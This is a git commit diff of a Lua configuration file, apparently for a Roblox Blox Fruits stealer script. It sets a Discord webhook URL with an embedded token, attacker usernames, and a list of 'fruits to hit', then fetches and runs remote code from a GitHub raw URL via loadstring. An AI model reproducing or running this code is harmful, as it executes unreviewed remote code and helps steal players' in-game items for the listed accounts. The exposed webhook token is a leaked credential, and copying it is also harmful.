b2ff7c55efcf1a79f4922c11afae1aeb11354ba9
REDV4 <arpitplayzxd@gmail.com>
2025-04-27 13:21:59 +0530

    redz.lua

--- redz.lua
+++ redz.lua
@@ -1,5 +1,5 @@
 Webhook = "https://discord.com/api/webhooks/1365957105735172096/zdCV-TYLUSa_70mJuDSynDOo2cUg344YbhDlpMFPb762tWgV8VU51oB8ouJ-ph1G_MLX" -- << Your Webhook
-Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+Usernames = {"ArpitPlayzz", "somealtuserhere2"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
